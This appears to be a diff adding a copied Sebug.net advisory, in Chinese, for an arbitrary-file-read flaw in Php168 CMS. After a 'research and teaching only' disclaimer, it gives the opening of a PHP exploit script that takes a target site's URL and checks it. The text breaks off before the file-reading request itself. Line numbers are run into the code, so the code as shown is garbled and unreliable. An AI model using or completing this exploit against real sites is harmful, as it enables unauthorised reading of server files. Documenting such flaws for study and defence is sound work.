@@ -1,0 +1,6 @@
+Php168 读取任意文件漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.<?php2.make_input('url','请输入Php168程序所在的地址,例如http://www.xxx.com/');3. 4.while (1){5.    if(substr($url,0,7)!=='http://')     make_input('url','大哥，这怎么可能是万维网所说的Url嘛，专业点');6.    else break;7.}8. 9.if(substr($url,0,-1)!=='/') $url.='/';10.//如果URL的最后一位不是/,
